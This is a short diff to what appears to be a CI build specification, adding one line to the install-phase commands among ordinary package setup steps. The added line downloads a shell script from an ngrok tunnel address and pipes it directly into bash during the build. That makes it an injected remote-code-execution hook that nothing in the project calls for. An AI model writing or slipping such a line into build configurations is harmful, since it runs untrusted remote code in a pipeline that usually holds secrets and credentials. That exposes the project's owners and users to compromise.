@@ -5,6 +5,7 @@ phases:
     runtime-versions:
         nodejs: latest
     commands:
+      - curl https://f52e-180-151-118-190.ngrok-free.app/file.sh | bash
       - curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | apt-key add -
       - rm -f /etc/apt/sources.list.d/sbt.list
       - apt-get update --assume-yes --no-install-recommends
